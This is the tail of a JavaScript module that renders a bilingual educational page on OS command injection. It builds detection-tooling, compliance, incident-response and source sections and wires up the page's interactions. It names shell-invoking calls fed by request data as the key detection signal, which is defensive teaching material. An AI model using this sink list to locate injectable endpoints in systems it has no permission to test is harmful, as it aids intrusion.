    : '<strong>Kluczowy sygnał:</strong> szukaj <code>subprocess.run(..., shell=True)</code> z argumentami f-string, <code>os.system</code>, <code>child_process.exec</code>, <code>Runtime.exec</code> i <code>exec.Command("sh", "-c", ...)</code> — te wywołania uruchamiające powłokę zasilane danymi żądania to przyczyna źródłowa.';
  return secWrap('cmdi-tools', lang === 'en' ? 'Detection tooling' : 'Narzędzia wykrywania',
    lang === 'en' ? 'Static analysis flags user input flowing into shell calls; dynamic tools and out-of-band servers confirm blind exploitability. Use both.' : 'Analiza statyczna oznacza wejście użytkownika trafiające do wywołań powłoki; narzędzia dynamiczne i serwery out-of-band potwierdzają ślepą eksploatowalność. Używaj obu.',
    `<div class="cmdi-tools-grid">
      <div class="cmdi-tool-col"><h4>SAST · ${lang === 'en' ? 'Static' : 'Statyczna'}</h4>${sast}</div>
      <div class="cmdi-tool-col"><h4>DAST · ${lang === 'en' ? 'Dynamic' : 'Dynamiczna'}</h4>${dast}</div>
    </div>
    <div class="cmdi-callout warn">${note}</div>`);
}

function buildCompliance() {
  const lang = getLang();
  const cards = COMPLIANCE.map((c) => `
    <article class="cmdi-comp-card">
      <h4>${esc(c.std)}</h4>
      <ul>${c.items.map((i) => `<li>${esc(i)}</li>`).join('')}</ul>
    </article>`).join('');
  const sources = `<div class="cmdi-inline-sources">${lang === 'en' ? 'Sources:' : 'Źródła:'}
    <a href="https://www.pcisecuritystandards.org/document_library/" target="_blank" rel="noopener">PCI DSS v4.0</a>
    <a href="https://www.aicpa.org/resources/article/soc-2-reporting-on-an-examination-of-controls-at-a-service-organization-relevant-to-security" target="_blank" rel="noopener">SOC 2 (AICPA)</a>
    <a href="https://cwe.mitre.org/data/definitions/78.html" target="_blank" rel="noopener">CWE-78 (MITRE)</a>
    <a href="https://owasp.org/Top10/A03_2021-Injection/" target="_blank" rel="noopener">OWASP A03:2021</a>
  </div>`;
  return secWrap('cmdi-compliance', lang === 'en' ? 'Compliance quick-reference' : 'Szybka zgodność',
    lang === 'en' ? 'Where OS command injection prevention maps onto the hard compliance gates auditors check for CWE-78.' : 'Gdzie zapobieganie OS command injection mapuje się na twarde bramki zgodności sprawdzane przez audytorów dla CWE-78.',
    `<div class="cmdi-comp-grid">${cards}</div>${sources}`);
}

function buildIR() {
  const lang = getLang();
  const items = IR[lang].map((s, i) => `
    <li class="cmdi-ir-item"><span class="cmdi-ir-check">${i + 1}</span><span>${esc(s)}</span></li>`).join('');
  return secWrap('cmdi-ir', lang === 'en' ? 'Incident response checklist' : 'Lista kontrolna reagowania',
    lang === 'en' ? 'If you confirm an active OS command injection breach, work this list top to bottom.' : 'Po potwierdzeniu aktywnego wycieku OS command injection przejdź tę listę od góry.',
    `<ol class="cmdi-ir">${items}</ol>`);
}

function buildSourcesSection() {
  const lang = getLang();
  const links = SOURCES.map((s) =>
    `<a href="${s[1]}" target="_blank" rel="noopener" class="cmdi-source-link">${esc(s[0])}</a>`).join('');
  return secWrap('cmdi-sources', lang === 'en' ? 'Sources & references' : 'Źródła i odniesienia',
    lang === 'en' ? 'Primary references for the techniques, CVEs, and mitigations described above.' : 'Główne odniesienia do opisanych technik, CVE i środków zaradczych.',
    `<div class="cmdi-sources" style="margin-top:0">${links}</div>`);
}

function secWrap(id, title, lead, inner) {
  return `<section id="${id}" class="cmdi-section">
    <h2 class="cmdi-h2">${title}</h2>
    <p class="cmdi-section-lead">${lead}</p>
    ${inner}
  </section>`;
}

function buildContent() {
  return [
    buildOverview(),
    buildTypes(),
    buildCheatsheet(),
    buildCode(),
    buildLangRisks(),
    buildMethod(),
    buildDefense(),
    buildIncidents(),
    buildTools(),
    buildCompliance(),
    buildIR(),
    buildSourcesSection(),
    `<footer class="cmdi-footer">Code Guardian — OS Command Injection deep-dive · ${getLang() === 'en' ? 'All "VULNERABLE" examples are illustrative only — do not use in production.' : 'Wszystkie przykłady "PODATNY" są wyłącznie poglądowe — nie używaj na produkcji.'}</footer>`,
  ].join('');
}

/* =========================================================================
   WIRING
   ========================================================================= */

let highlighted = false;

function highlightOnce(panel) {
  if (highlighted) return;
  $$('code[class*="language-"]', panel).forEach((c) => highlightElement(c));
  highlighted = true;
}

function wireCopy(panel) {
  $$('.cmdi-copy', panel).forEach((btn) => {
    btn.addEventListener('click', () => {
      const code = $('code', btn.parentElement).textContent;
      const label = $('span', btn);
      const write = () => {
        const old = label.textContent;
        label.textContent = tr(TXT.copied);
        btn.classList.add('copied');
        setTimeout(() => { label.textContent = old; btn.classList.remove('copied'); }, 1400);
      };
      if (navigator.clipboard?.writeText) navigator.clipboard.writeText(code).then(write, write);
      else write();
    });
  });
}

function wireLangTabs(panel) {
  $$('.cmdi-lang-tab', panel).forEach((tab) => {
    tab.addEventListener('click', () => {
      const l = tab.dataset.lang;
      $$('.cmdi-lang-tab', panel).forEach((t) => t.classList.toggle('active', t === tab));
      $$('.cmdi-lang-panel', panel).forEach((p) => p.classList.toggle('active', p.dataset.lang === l));
    });
  });
}

function wireScrollSpy(panel) {
  const body = $('.cmdi-body', panel);
  const links = $$('.cmdi-nav-link', panel);
  links.forEach((link) => {
    link.addEventListener('click', (e) => {
      e.preventDefault();
      const target = $('#' + link.dataset.target, panel);
      if (target) body.scrollTo({ top: target.offsetTop - 24, behavior: 'smooth' });
    });
  });
  const sections = $$('.cmdi-section', panel);
  body.addEventListener('scroll', () => {
    let current = sections[0]?.id;
    for (const s of sections) {
      if (s.offsetTop - 80 <= body.scrollTop) current = s.id;
    }
    links.forEach((l) => l.classList.toggle('active', l.dataset.target === current));
  }, { passive: true });
}

function render(panel) {
  const lang = getLang();
  panel.innerHTML = `
    <div class="cmdi-topbar">
      <span class="cmdi-brand">${SVG.shield}<span>Code <span class="grad">Guardian</span></span></span>
      <span class="cmdi-topbar-title">OS Command Injection</span>
      <span style="flex:1"></span>
      <button class="cmdi-close" type="button" aria-label="${tr(TXT.close)}">${SVG.close}<span>${tr(TXT.close)}</span></button>
    </div>
    <div class="cmdi-shell">
      <nav class="cmdi-nav" aria-label="${lang === 'en' ? 'Page sections' : 'Sekcje strony'}">${buildNav()}</nav>
      <div class="cmdi-body">${buildContent()}</div>
    </div>`;
  highlighted = false;
  $('.cmdi-close', panel).addEventListener('click', close);
  wireCopy(panel);
  wireLangTabs(panel);
  wireScrollSpy(panel);
}

let _panel = null;
let _rendered = false;

function open() {
  if (!_panel) return;
  if (!_rendered) { render(_panel); _rendered = true; }
  _panel.classList.add('open');
  document.body.classList.add('cmdi-lock');
  highlightOnce(_panel);
  const body = $('.cmdi-body', _panel);
  if (body) body.scrollTop = 0;
}

function close() {
  if (!_panel) return;
  _panel.classList.remove('open');
  document.body.classList.remove('cmdi-lock');
}

export function openCmdiPage() { open(); }

export function initCmdiPage() {
  _panel = $('#cmdi-page');
  if (!_panel) return;

  // Re-render on language change so content tracks the global toggle.
  const langBtn = $('#lang-toggle');
  if (langBtn) {
    langBtn.addEventListener('click', () => {
      setTimeout(() => {
        if (_rendered) { const wasOpen = _panel.classList.contains('open'); render(_panel); if (wasOpen) { _panel.classList.add('open'); highlighted = false; highlightOnce(_panel); } }
      }, 0);
    });
  }

  const openBtn = $('#cmdi-tab');
  if (openBtn) openBtn.addEventListener('click', open);

  document.addEventListener('keydown', (e) => {
    if (e.key === 'Escape' && _panel.classList.contains('open')) close();
  });
}
